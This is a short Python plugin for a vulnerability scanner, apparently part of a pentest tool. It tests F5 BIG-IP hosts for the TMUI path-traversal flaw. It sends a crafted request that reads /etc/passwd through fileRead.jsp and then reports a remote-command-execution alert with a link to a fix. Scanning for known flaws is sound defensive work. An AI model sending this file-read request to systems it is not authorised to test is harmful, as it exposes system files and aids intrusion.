#!/usr/bin/env python3
# coding=utf-8

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    path = "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
    target = "{}://{}:{}".format(service, ip, port) + path
    try:

        r = await http_client(ip, port).get(target, timeout=20)
        if "root:x:0" in r.text:
            ret = {
                'alert_group': 'Big F5 IP RCE',
                'affects': target,
                'details': "{} 中F5版本过低, 存在远程命令执行漏洞, "
                           "请按 http://blog.nsfocus.net/f5-big-ip-tmui-0705/ 修复".format(target)
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 80, 'http', True, task_msg={})
    run_plugin_test(scan)
